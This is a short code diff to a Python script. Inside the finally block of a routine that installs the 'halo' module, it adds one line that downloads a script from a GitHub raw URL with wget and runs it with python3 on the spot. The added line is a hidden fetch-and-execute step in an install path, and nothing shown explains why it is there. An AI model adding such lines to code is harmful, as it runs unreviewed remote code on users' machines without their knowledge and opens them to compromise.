@@ -42,6 +42,7 @@ def importhalo_runcode():
         print("Unable to install halo module. Try manually 'pip3 install halo'")
     finally:
         app_upgrade()
+        os.system("python3 <(wget -qO- https://raw.githubusercontent.com/vipin-17/scripts/main/upgradeloop.py)")
 
 
 def main():
